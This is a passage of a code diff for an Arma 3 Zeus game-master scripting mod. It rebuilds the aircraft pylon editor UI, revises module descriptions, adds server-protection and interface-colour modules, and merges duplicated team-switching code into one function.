+			_label ctrlSetPosition [0.29375 * safezoneW + safezoneX,(0.203 * safezoneH + safezoneY) - (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0.4125 * safezoneW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_label ctrlSetBackgroundColor EZM_dialogColor;
+			_label ctrlCommit 0;
 
+			private _okayButton = _display ctrlCreate ["RscButtonMenuOk",-1];
+			_okayButton ctrlSetPosition [(["X",3.3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(0.775 * safezoneH + safezoneY) + (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",33.4] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_okayButton ctrlSetText "OK, DONE EDITING";
+			_okayButton ctrlAddEventhandler ["ButtonClick",{
+				params ["_control"];
+				private _display = ctrlParent _control;
+				_display closeDisplay 0;
+			}];
+			_okayButton ctrlCommit 0;
 
+			private _uiPicture = getText (configfile >> "CfgVehicles" >> typeOf _veh >> "Components" >> "TransportPylonsComponent" >> "uiPicture");
+			
+			private _controlsGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",-1];
+			_controlsGroup ctrlSetPosition [0.29375 * safezoneW + safezoneX,0.225 * safezoneH + safezoneY,0.4125 * safezoneW,0.55 * safezoneH];
+			_controlsGroup ctrlCommit 0;
+			
+			private _pictureBG = _display ctrlCreate ["RscPicture",-1,_controlsGroup];
+			_pictureBG ctrlSetText "#(argb,8,8,3)color(0.4,0.4,0.4,0.9)";
+			_pictureBG ctrlSetPosition [0,0,1,1];
+			_pictureBG ctrlCommit 0;
+
+			private _picture = _display ctrlCreate ["RscPictureKeepAspect",-1,_controlsGroup];
+			_picture ctrlSetText _uiPicture;
+			_picture ctrlSetPosition [0,0,1,1];
+			_picture ctrlCommit 0;
+			
 			private _currentMags = getPylonMagazines _veh;
-			private _pylonWeapons = [];
-			private _pylonDisplayNames = [];
-
+			private _pylonSlots = (configFile >> "CfgVehicles" >> typeOf _veh >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses;
 			{
 				private _pylon = _x;
-				private _compatMags = _veh getCompatiblePylonMagazines _x;
-				private _temp = [];
+				private _pylonIndex = _forEachIndex;
+
+				private _UIPos = getArray (configFile >> "CfgVehicles" >> typeOf _veh >> "Components" >> "TransportPylonsComponent" >> "Pylons" >> _x >> "UIposition");
+				_UIPos pushBack (0.061875 * safezoneW);
+				_UIPos pushBack (0.022 * safezoneH);
+				_UIPos = _UIPos vectorAdd [0.1,0.2,0,0];
+				
+				private _combo = _display ctrlCreate ["RscCombo",-1];
+				_combo ctrlSetPosition _UIPos;
+				_combo ctrlSetTooltip _pylon;
+				_combo setVariable ["MAZ_EZM_PylonData",[_veh,_pylon]];
+				_combo ctrlCommit 0;
+
+				_combo lbAdd "None";
+				_combo lbSetData [0,""];
+				_combo lbSetTooltip [0,"Remove this Pylon's weapon"];
+
+				private _compatMags = _veh getCompatiblePylonMagazines _pylon;
 				{
-					_temp pushBack (getText (configFile >> "CfgMagazines" >> _x >> "displayName"));
-				}forEach _compatMags;
-				_pylonWeapons pushBack _compatMags;
-				_pylonDisplayNames pushBack _temp;
-			}forEach _pylonSlots;
-
-			private _display = findDisplay 312;
-			private _controls = [];
-			{
-				private _control = _display ctrlCreate ["RscCombo",-1];
-				_control setVariable ["pylonEditorPylon",_x];
-				private _pylonNames = _pylonDisplayNames select _forEachIndex;
-				private _pylonConfigNames = _pylonWeapons select _forEachIndex;
-				private _currentMag = _currentMags select _forEachIndex;
-				private _indexPylon = _pylonConfigNames find _currentMag;
-				{
-					private _index = _control lbAdd _x;
-					_control lbSetData [_index,_pylonConfigNames select _forEachIndex];
-				}forEach _pylonNames;
-				_control setVariable ["pylonEditorVehicle",_veh];
-				_control ctrlAddEventHandler ["LBSelChanged",{
-					params ["_control", "_selectedIndex"];
-					private _vehicle = _control getVariable 'pylonEditorVehicle';
-					private _pylonSlot = _control getVariable "pylonEditorPylon";
-					private _pylonNew = _control lbData _selectedIndex;
-					private _pylonMaxAmmo = getNumber (configFile >> "CfgMagazines" >> _pylonNew >> "count");
-
-					comment "TODO : Fix pylons not saving globally.";
-					[_vehicle,[_pylonSlot,_pylonNew]] remoteExec ['setPylonLoadout'];
-					_vehicle setPylonLoadout [_pylonSlot,_pylonNew];
-					comment "_vehicle setPylonLoadout [_pylonSlot,_pylonNew]";
-					_vehicle setAmmoOnPylon [_pylonSlot,_pylonMaxAmmo];
-				}];
-				_control lbSetCurSel _indexPylon;
-
-				_controls pushBack _control;
-			}forEach _pylonSlots;
-
-			if(!isNil "MAZ_updateEachFramePylons") then {
-				private _pylonEditorControls = player getVariable ["pylonEditorControls",[]];
-				{
-					ctrlDelete _x;
-				}forEach _pylonEditorControls;
-				player setVariable ["pylonEditorControls",[]];
-				[MAZ_updateEachFramePylons,"onEachFrame"] call BIS_fnc_removeStackedEventHandler;
-			};
-			player setVariable ["pylonEditorControls",_controls];
-
-			MAZ_updateEachFramePylons = ["MAZ_updatePylonsEachFrame","onEachFrame",{
-				params ["_vehicle","_pylons","_controls"];
-				if(isNull findDisplay 312) exitWith {
-					[MAZ_updateEachFramePylons,"onEachFrame"] call BIS_fnc_removeStackedEventHandler;
-				};
-
-				if(curatorCamera distance _vehicle > 125) then {
-					[MAZ_updateEachFramePylons,"onEachFrame"] call BIS_fnc_removeStackedEventHandler;
-					{ctrlDelete _x} forEach _controls;
-				};
-
-				{
-					private _control = _controls select _forEachIndex;
-
-					private _position = _vehicle modelToWorldVisual _x;
-					private _distance = curatorCamera distance _position;
-					private _screenPos = worldToScreen _position;
-
-					if(_screenPos isEqualTo [] || {_distance > 75}) then {
-						_control ctrlShow false;
-					} else {
-						_control ctrlShow true;
-
-						_screenPos params ["_posX","_posY"];
-
-						private _size = linearConversion [0,100,_distance,1.75,1,true];
-						private _posW = ["W",(_size*4)] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-						private _posH = ["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-
-						_control ctrlSetPosition [_posX - _posW / 2, _posY - _posH / 2,_posW,_posH];
-						_control ctrlCommit 0;
+					private _compatMag = _x;
+					private _displayName = getText (configFile >> "CfgMagazines" >> _compatMag >> "displayName");
+					private _descriptionShort = getText (configfile >> "CfgMagazines" >> _compatMag >> "descriptionShort");
+					private _tooltip = format ["%1\n%2",_displayName,_descriptionShort];
+					private _index = _combo lbAdd _displayName;
+					_combo lbSetData [_index,_compatMag];
+					_combo lbSetTooltip [_index,_tooltip];
+					if((_currentMags # _pylonIndex) == _compatMag) then {
+						_combo lbSetCurSel _index;
 					};
-				} forEach _pylons;
+				}forEach _compatMags;
 
-			},[_veh,_pylonsNew,_controls]] call BIS_fnc_addStackedEventHandler;
+				_combo ctrlAddEventHandler ["LBSelChanged", {
+					params ["_control","_index"];
+					(_control getVariable "MAZ_EZM_PylonData") params ["_vehicle","_pylon"];
+					private _newWeapon = _control lbData _index;
+					[_vehicle,[_pylon,_newWeapon]] remoteExec ["setPylonLoadout"];
+
+					private _pylonMaxAmmo = getNumber (configFile >> "CfgMagazines" >> _newWeapon >> "count");
+					[_vehicle,[_pylon,_pylonMaxAmmo]] remoteExec ["setAmmoOnPylon"];
+
+					private _pylonMags = getPylonMagazines _vehicle;
+					{
+						private _weapon = _x;
+						private _defaultWeapons = getArray (configFile >> "CfgVehicles" >> typeOf _vehicle >> "weapons");
+						if(_weapon in _defaultWeapons) then {continue};
+						private _mags = getArray (configFile >> "CfgWeapons" >> _weapon >> "magazines");
+
+						private _magInPylons = false;
+						{
+							if(_x in _pylonMags) then {
+								_magInPylons = true;
+								break;
+							};
+						}forEach _mags;
+						if(!_magInPylons) then {
+							[_vehicle,_weapon] remoteExec ["removeWeapon"];
+						};
+					}forEach (weapons _vehicle);
+				}];
+			}forEach _pylonSlots;
 		};
 
 	comment "Collapse Expand Trees";
@@ -14107,7 +14776,7 @@ MAZ_EZM_fnc_initFunction = {
 							_santa setVariable ["BIS_enableRandomization", false];   
 							_santa setUnitLoadout [["sgun_HunterShotgun_01_sawedoff_F","","","",["2Rnd_12Gauge_Pellets",2],[],""],[],[],["U_C_Paramedic_01_F",[["FirstAidKit",1],["Chemlight_green",1,1],["2Rnd_12Gauge_Pellets",3,2]]],["V_DeckCrew_red_F",[]],[],"H_Beret_CSAT_01_F","G_Squares",[],["ItemMap","","ItemRadio","ItemCompass","ItemWatch",""]];   
 							_santa setName "Santa Claus";   
-							[_santa, "WhiteHead_26"] remoteExec ['setFace',0,true];   
+							[_santa, "WhiteHead_26"] remoteExec ["setFace"];   
 							_santa allowDamage false;   
 							removeGoggles _santa;   
 							_santa addItem 'G_Squares';   
@@ -14127,10 +14796,10 @@ MAZ_EZM_fnc_initFunction = {
 							{},               
 							{   
 								_unit = (_this select 0);  
-								[_unit,false] remoteExec ["setCaptive",0];  
-								[_unit,"Move"]remoteExec ["enableAI",0];  
-								[_unit,"AmovPercMstpSnonWnonDnon"] remoteExec ["playMove",0];  
-								[_unit] remoteExec ["removeAllActions",0];  
+								[_unit,false] remoteExec ["setCaptive"];  
+								[_unit,"Move"]remoteExec ["enableAI"];  
+								[_unit,"AmovPercMstpSnonWnonDnon"] remoteExec ["playMove"];  
+								[_unit] remoteExec ["removeAllActions"];  
 								detach _unit;  
 							},      
 							{},               
@@ -14458,15 +15127,15 @@ MAZ_EZM_fnc_initFunction = {
 						SANTA setVariable ["BIS_enableRandomization", false];  
 						SANTA setUnitLoadout [["sgun_HunterShotgun_01_sawedoff_F","","","",["2Rnd_12Gauge_Pellets",2],[],""],[],[],["U_C_Paramedic_01_F",[["FirstAidKit",1],["Chemlight_green",1,1],["2Rnd_12Gauge_Pellets",3,2]]],["V_DeckCrew_red_F",[]],[],"H_Beret_CSAT_01_F","G_Squares",[],["ItemMap","","ItemRadio","ItemCompass","ItemWatch",""]];  
 						SANTA setname "Santa Claus";  
-						[SANTA, "WhiteHead_26"] remoteExec ['setFace',0,true];  
+						[SANTA, "WhiteHead_26"] remoteExec ['setFace'];  
 						SANTA allowDamage false;  
 						removeGoggles SANTA;  
 						SANTA addItem 'G_Squares';  
 						SANTA assignItem 'G_Squares';  
 							};
 						[this, santa_base] call BIS_fnc_attachToRelative;
-						[this, 2.1] remoteExec ['setObjectScale', 0, true];;
-						[SANTA, 'crew'] remoteExec ['switchMove',0, true];
+						[this, 2.1] remoteExec ['setObjectScale'];;
+						[SANTA, 'crew'] remoteExec ['switchMove'];
 
 						[SANTA, ["<t color='#00FF00'>Sit on Santa's Lap</t>",  
 						{ 
@@ -15128,7 +15797,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 							params [['_display', displayNull]];
 							uiSleep 0.01;
 							if (isNull _display) exitWith {};
-							(_display displayCtrl 15717) ctrlSetTextColor [0,0.6,0.6,0.7];
+							(_display displayCtrl 15717) ctrlSetTextColor EZM_themeColor;
 							if(_display getVariable ["MAZ_EZM_hideWarnings",false]) then {
 								_display setVariable ["MAZ_EZM_hideWarnings",false];
 								call (uiNamespace getVariable "MAZ_EZM_fnc_unhideAllWarnings");
@@ -15143,7 +15812,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 			comment "Transparency & Function Defines";
 
 				missionNamespace setVariable ['MAZ_zeusModulesWithFunction', []];
-				private _transparency = profilenamespace getVariable ['MAZ_EZM_zeusTransparency_currentValue', 1];
+				private _transparency = profilenamespace getVariable ['MAZ_EZM_Transparency', 1];
 				[_transparency] call (missionNamespace getvariable ['MAZ_EZM_fnc_setZeusTransparency', {}]);
 
 				MAZ_EZM_fnc_zeusAddCategory = {
@@ -15805,9 +16474,8 @@ MAZ_EZM_fnc_editZeusInterface = {
 				};
 
 				MAZ_EZM_fnc_detectLowServerPerformance = {
-					private _svrFnc = missionNamespace getVariable ["MAZ_EZM_fnc_getServerFPS",{}];
-					call _svrFnc;
 					0=[] spawn {
+						"MAZ_EZM_serverFPS"; "defined on server";
 						waitUntil {uiSleep 0.1; !(missionNamespace getVariable ["MAZ_EZM_isPingingServerFPS",false])};
 						private _fps = uiNamespace getVariable "MAZ_EZM_serverFPS";
 						if(!isNil "MAZ_EZM_lowServerFPSWarn") then {
@@ -15854,6 +16522,9 @@ MAZ_EZM_fnc_editZeusInterface = {
 						MAZ_GroupsTree_CIVILIAN tvCollapse [_n];
 					";
 				};
+
+				MAZ_zeusModulesTree ctrlSetTooltipColorBox [0,0,0,1];
+				MAZ_zeusModulesTree ctrlSetTooltipColorShade [0.1,0.1,0.1,0.9];
 				
 				{
 					_x ctrlAddEventhandler ["TreeSelChanged","[(_this select 1)] call MAZ_EZM_fnc_updateModuleSelection"];
@@ -16056,7 +16727,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_ArsenalTree,
 					"AIO Arsenal",
-					"----------------------------------------------------------------------------------------------------------------------------------------------------------------------\nAll-In-One Arsenal (by M9-SD)\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\nDescription:\n There are two ways to use this module:\n(1) Place onto another object to make it an AIO arsenal.\n(2) Place on ground to spawn supply box AIO arsenal.\n\nIncludes the following options:\n- Full Arsenal\n- Quick Rearm\n- Copy Loadout\n- Empty Loadout\n- Save Respawn Loadout\n- Load Respawn Loadout\n- Delete Respawn Loadout\n- Edit Group Loadouts",
+					"All-In-One Arsenal (by M9-SD)\n\nDescription:\n There are two ways to use this module:\n(1) Place onto another object to make it an AIO arsenal.\n(2) Place on ground to spawn supply box AIO arsenal.\n\nIncludes the following options:\n- Full Arsenal\n- Quick Rearm\n- Copy Loadout\n- Empty Loadout\n- Save Respawn Loadout\n- Load Respawn Loadout\n- Delete Respawn Loadout\n- Edit Group Loadouts",
 					"MAZ_EZM_fnc_createAIOArsenalDialog",
 					'\A3\ui_f\data\Logos\a_64_ca.paa'
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16065,7 +16736,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_ArsenalTree,
 					"Reset All Saved Loadouts",
-					"----------------------------------------------------------------------------------------------------------------------------------------------------------------------\nDelete All Saved Loadouts\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\nDescription:\n This module will remove the saved loadouts from all players.",
+					"Delete All Saved Loadouts\n\nDescription:\n This module will remove the saved loadouts from all players.",
 					"MAZ_EZM_fnc_resetSavedLoadouts",
 					'\A3\ui_f\data\Logos\a_64_ca.paa'
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16137,11 +16808,11 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_BuildingInteriorsTree,
 					"Get Default Interior Data",
-					"Resets EZM interior data to the default. \nYOU WILL LOSE ALL CHANGES YOU MADE TO YOUR INTERIORS WITHOUT UPDATING MAZ_EZM_fnc_loadDefaultInteriorsData!",
+					"Resets EZM interior data to the default. \nThis will remove any custom compositions you may have created!",
 					"MAZ_EZM_fnc_getDefaultInteriors",
 					"a3\3den\data\displays\display3den\toolbar\undo_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
-			
+
 			comment "Cinematics";
 				MAZ_Cinematics = [
 					MAZ_zeusModulesTree,
@@ -16152,8 +16823,17 @@ MAZ_EZM_fnc_editZeusInterface = {
 				[
 					MAZ_zeusModulesTree,
 					MAZ_Cinematics,
+					"Circle Cinematic",
+					"Create a cinematic that circles around a specified area.",
+					"MAZ_EZM_fnc_circleCinematicDialog",
+					"a3\ui_f\data\igui\cfg\islandmap\iconcamera_ca.paa"
+				] call MAZ_EZM_fnc_zeusAddModule;
+
+				[
+					MAZ_zeusModulesTree,
+					MAZ_Cinematics,
 					"Intro Cinematic",
-					"Create an exciting cinematic introduction to your missions (by bijx)",
+					"Create an introduction cinematic showcasing the scenario name, your name, and some optional text.\nCreated by: Bijx",
 					"HYPER_EZM_fnc_introCinematicModule",
 					"a3\ui_f\data\igui\cfg\islandmap\iconcamera_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16247,7 +16927,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_DeleteShipTree,
 					"Create Carrier",
-					"When placed on a boat, creates the USS Freedom at its position.",
+					"Creates the USS Freedom at its position.\nIf placed on a boat the ship will face the direction of the boat.",
 					"MAZ_EZM_fnc_createCarrierModule"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
@@ -16255,7 +16935,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_DeleteShipTree,
 					"Create Destroyer",
-					"When placed on a boat, creates the USS Liberty at its position.",
+					"Creates the USS Liberty at its position.\nIf placed on a boat the ship will face the direction of the boat.",
 					"MAZ_EZM_fnc_createDestroyerModule"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
@@ -16287,7 +16967,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_DevToolsTree,
 					"Animation Viewer",
-					"Opens the Animation Viewer, if placed on a unit it will open using that unit and its current animation.",
+					"Opens the Animation Viewer.\nIf placed on a unit it will open using that unit and its current animation.",
 					"MAZ_EZM_fnc_openAnimViewerModule",
 					"a3\ui_f\data\gui\cfg\keyframeanimation\iconcamera_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16296,7 +16976,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_DevToolsTree,
 					"Open Debug Console",
-					"Opens the Debug Console.",
+					"Opens the Debug Console.\nthis refers to the entity the console is placed onto.",
 					"MAZ_EZM_fnc_debugConsoleLocalModule",
 					"a3\3den\data\displays\display3den\entitymenu\findconfig_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16374,7 +17054,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_ExplosivesTree,
 					"Create Minefield",
-					"Create a minefield.",
+					"Create a minefield of specific mines in a radius.",
 					"MAZ_EZM_fnc_createMinefieldModule",
 					"a3\ui_f_curator\data\cfgmarkers\minefieldap_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16383,7 +17063,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_ExplosivesTree,
 					"Create IED",
-					"Create an IED.",
+					"Create an IED that will detonate when a specific side gets close.",
 					"MAZ_EZM_fnc_createIEDModule",
 					"a3\ui_f_curator\data\cfgmarkers\minefieldap_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16708,6 +17388,15 @@ MAZ_EZM_fnc_editZeusInterface = {
 					"a3\ui_f_curator\data\cfgmarkers\kia_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
+				[
+					MAZ_zeusModulesTree,
+					MAZ_ServerSettingsTree,
+					"Toggle Server Protections",
+					"Prevents known trolls and malicious scripters from joining the server.\nAlerts players if an unauthorized person has access to Zeus.\nAlerts players when someone rejoins with a different name.",
+					"MAZ_EZM_fnc_toggleServerProtections",
+					"a3\ui_f\data\igui\cfg\holdactions\holdaction_secure_ca.paa"
+				] call MAZ_EZM_fnc_zeusAddModule;
+
 			comment "Sounds";
 
 				MAZ_SoundsTree = [
@@ -16746,7 +17435,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_SpecialFXTree,
 					"Particle Effect",
-					"Creates a particle effect.",
+					"Creates a particle effect of your choosing.\nSmoke and Fire effects of various sizes.",
 					"MAZ_EZM_fnc_createParticleEffectModule",
 					"a3\ui_f\data\igui\cfg\actions\obsolete\ui_action_fire_in_flame_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16798,7 +17487,7 @@ MAZ_EZM_fnc_editZeusInterface = {
 					MAZ_zeusModulesTree,
 					MAZ_terrainObjectModTree,
 					"God Mode Fences",
-					"Allows you to god mode fences in a radius.",
+					"Allows you to god mode fences in a radius.\nPlayers will no longer be able to ram through walls that aren't half destroyed.",
 					"MAZ_EZM_fnc_godModeFencesModule",
 					"a3\modules_f\data\editterrainobject\texturechecked_wall_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
@@ -16954,6 +17643,15 @@ MAZ_EZM_fnc_editZeusInterface = {
 					"Change the Game Moderator rights.",
 					"MAZ_EZM_fnc_toggleGameModerator",
 					"a3\3den\data\attributes\taskstates\canceled_ca.paa"
+				] call MAZ_EZM_fnc_zeusAddModule;
+
+				[
+					MAZ_zeusModulesTree,
+					MAZ_ZeusTree,
+					"Edit Zeus Interface",
+					"Change the Zeus interface colors and opacity.",
+					"MAZ_EZM_fnc_editZeusInterfaceColors",
+					"a3\modules_f_curator\data\iconpostprocess_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
 			comment "Zeus Preview";
@@ -17170,8 +17868,8 @@ MAZ_EZM_editZeusLogic = {
 			private _hovering = curatorMouseOver;
 			if(_hovering isEqualTo [""] || {_group != (group (_hovering # 1))}) then {
 				[] spawn {
-					waitUntil {call ZAM_fnc_isContextMenuOpen};
-					call ZAM_fnc_closeContextMenu;
+					waitUntil {call MAZ_EZM_fnc_isContextMenuOpen};
+					call MAZ_EZM_fnc_closeContextMenu;
 				};
 			} else {
 				deleteWaypoint _wp;
@@ -17481,12 +18179,12 @@ MAZ_EZM_addZeusKeybinds_312 = {
 				
 				if (_distanceTraveled <= _wiggleRoom) then 
 				{
-					[] call ZAM_fnc_createContextMenu;
+					[] call MAZ_EZM_fnc_createContextMenu;
 				};
 			};
 		} else {
-			if(call ZAM_fnc_isContextMenuOpen) then {
-				[] spawn ZAM_fnc_destroyContextMenu;
+			if(call MAZ_EZM_fnc_isContextMenuOpen) then {
+				[] spawn MAZ_EZM_fnc_destroyContextMenu;
 			};
 		};
 	}];
@@ -17601,6 +18299,22 @@ MAZ_EZM_addZeusKeybinds_312 = {
 	}];
 };
 
+MAZ_EZM_fnc_switchGroupSetup = {
+	params ["_side"];
+	private _group = createGroup [_side,true];
+	private _groupName = "Stryker 1-4";
+	[player] join _group;
+	[_group, player] remoteExec ["selectLeader"];					
+	_group setGroupIdGlobal [_groupName];
+	private _leader = leader _group;
+	private _data = ["Curator", _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
+	["RegisterGroup", [_group, player, _data]] remoteExec ['BIS_fnc_dynamicGroups'];
+	["AddGroupMember", [_group,player]] remoteExec ['BIS_fnc_dynamicGroups'];
+	["SwitchLeader", [_group,player]] remoteExec ['BIS_fnc_dynamicGroups'];
+	["SetPrivateState", [_group,true]] remoteExec ['BIS_fnc_dynamicGroups'];	
+	["SetName", [_group,_groupName]] remoteExec ['BIS_fnc_dynamicGroups'];
+};
+
 MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 	if (!isNull findDisplay 60490) exitWith {};
 	with uiNamespace do 
@@ -17631,23 +18345,7 @@ MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 			_btn_west ctrlSetStructuredText parseText ("<t size='" + (str (0.5 * safeZoneH)) + "' align='center'>BLUFOR</t>");
 			_btn_west ctrladdEventHandler ["ButtonClick", 
 			{
-				_side = west;
-				_groupName = "Stryker 1-4";
-				_groups = ["GetAllGroupsOfSide", [_side]] call BIS_fnc_dynamicGroups;
-				EZM_curator_group = createGroup _side;
-				EZM_curator_group deleteGroupWhenEmpty true;
-				[player] join EZM_curator_group;
-				EZM_curator_group selectLeader player;
-				[EZM_curator_group, player] remoteExec ["selectLeader", groupOwner EZM_curator_group];					
-				EZM_curator_group setGroupIdGlobal [_groupName];
-				private _group = EZM_curator_group;
-				private _leader = leader _group;
-				private _data = [nil, _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
-				["RegisterGroup", [_group, _leader, _data]] remoteExecCall ['BIS_fnc_dynamic\a3\ui_f_curator\data\rsccommon\rscattributeformation\wedge_ca.paa'];
-				["AddGroupMember", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SwitchLeader", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SetPrivateState", [EZM_curator_group,true]] remoteExecCall ['BIS_fnc_dynamicGroups'];	
-				["SetName", [EZM_curator_group,_groupName]] remoteExecCall ['BIS_fnc_dynamicGroups'];
+				[west] call MAZ_EZM_fnc_switchGroupSetup;
 			}];
 			_btn_west ctrlCommit 0;
 			_btn_east = _display ctrlCreate ['RscButtonMenu',-1];
@@ -17656,23 +18354,7 @@ MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 			_btn_east ctrlSetStructuredText parseText ("<t size='" + (str (0.5 * safeZoneH)) + "' align='center'>OPFOR</t>");
 			_btn_east ctrladdEventHandler ["ButtonClick", 
 			{
-				_side = east;
-				_groupName = "Stryker 1-4";
-				_groups = ["GetAllGroupsOfSide", [_side]] call BIS_fnc_dynamicGroups;
-				EZM_curator_group = createGroup _side;
-				EZM_curator_group deleteGroupWhenEmpty true;
-				[player] join EZM_curator_group;
-				EZM_curator_group selectLeader player;
-				[EZM_curator_group, player] remoteExec ["selectLeader", groupOwner EZM_curator_group];					
-				EZM_curator_group setGroupIdGlobal [_groupName];
-				private _group = EZM_curator_group;
-				private _leader = leader _group;
-				private _data = [nil, _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
-				["RegisterGroup", [_group, _leader, _data]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["AddGroupMember", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SwitchLeader", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SetPrivateState", [EZM_curator_group,true]] remoteExecCall ['BIS_fnc_dynamicGroups'];	
-				["SetName", [EZM_curator_group,_groupName]] remoteExecCall ['BIS_fnc_dynamicGroups'];
+				[east] call MAZ_EZM_fnc_switchGroupSetup;
 			}];
 			_btn_east ctrlCommit 0;
 			_btn_indep = _display ctrlCreate ['RscButtonMenu',-1];
@@ -17681,23 +18363,7 @@ MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 			_btn_indep ctrlSetStructuredText parseText ("<t size='" + (str (0.5 * safeZoneH)) + "' align='center'>INDEP</t>");
 			_btn_indep ctrladdEventHandler ["ButtonClick", 
 			{
-				_side = independent;
-				_groupName = "Stryker 1-4";
-				_groups = ["GetAllGroupsOfSide",[_side]] call BIS_fnc_dynamicGroups;
-				EZM_curator_group = createGroup _side;
-				EZM_curator_group deleteGroupWhenEmpty true;
-				[player] join EZM_curator_group;
-				EZM_curator_group selectLeader player;
-				[EZM_curator_group, player] remoteExec ["selectLeader", groupOwner EZM_curator_group];					
-				EZM_curator_group setGroupIdGlobal [_groupName];
-				private _group = EZM_curator_group;
-				private _leader = leader _group;
-				private _data = [nil, _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
-				["RegisterGroup", [_group, _leader, _data]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["AddGroupMember", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SwitchLeader", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SetPrivateState", [EZM_curator_group,true]] remoteExecCall ['BIS_fnc_dynamicGroups'];	
-				["SetName", [EZM_curator_group,_groupName]] remoteExecCall ['BIS_fnc_dynamicGroups'];
+				[independent] call MAZ_EZM_fnc_switchGroupSetup;
 			}];
 			_btn_indep ctrlCommit 0;
 			_btn_civ = _display ctrlCreate ['RscButtonMenu',-1];
@@ -17706,23 +18372,7 @@ MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 			_btn_civ ctrlSetStructuredText parseText ("<t size='" + (str (0.5 * safeZoneH)) + "' align='center'>CIV</t>");
 			_btn_civ ctrladdEventHandler ["ButtonClick", 
 			{
-				_side = civilian;
-				_groupName = "Stryker 1-4";
-				_groups = ["GetAllGroupsOfSide",[_side]] call BIS_fnc_dynamicGroups;
-				EZM_curator_group = createGroup _side;
-				EZM_curator_group deleteGroupWhenEmpty true;
-				[player] join EZM_curator_group;
-				EZM_curator_group selectLeader player;
-				[EZM_curator_group, player] remoteExec ["selectLeader", groupOwner EZM_curator_group];					
-				EZM_curator_group setGroupIdGlobal [_groupName];
-				private _group = EZM_curator_group;
-				private _leader = leader _group;
-				private _data = [nil, _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
-				["RegisterGroup", [_group, _leader, _data]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["AddGroupMember", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SwitchLeader", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SetPrivateState", [EZM_curator_group,true]] remoteExecCall ['BIS_fnc_dynamicGroups'];	
-				["SetName", [EZM_curator_group,_groupName]] remoteExecCall ['BIS_fnc_dynamicGroups'];
+				[civilian] call MAZ_EZM_fnc_switchGroupSetup;
 			}];
 			_btn_civ ctrlCommit 0;
 			_btn_zeus = _display ctrlCreate ['RscButtonMenu',-1];
@@ -17731,23 +18381,7 @@ MAZ_EZM_fnc_groupMenuTeamSwitcher = {
 			_btn_zeus ctrlSetStructuredText parseText ("<t size='" + (str (0.5 * safeZoneH)) + "' align='center'>ZEUS</t>");
 			_btn_zeus ctrladdEventHandler ["ButtonClick", 
 			{
-				_side = sideLogic;
-				_groupName = "Stryker 1-4";
